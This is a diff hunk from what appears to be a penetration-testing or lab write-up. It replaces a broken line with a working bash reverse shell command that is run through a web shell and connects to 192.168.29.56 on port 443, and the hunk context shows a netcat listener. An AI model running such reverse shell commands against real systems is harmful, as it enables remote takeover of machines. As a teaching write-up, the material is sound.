@@ -293,7 +293,7 @@ sudo nc -lvnp 443
 Execute the following reverse shell command through the web shell.
 
 ```bash
-bash "
+bash -c "bash -i >& /dev/tcp/192.168.29.56/443 0>&1"
 ```
 
 ### Result
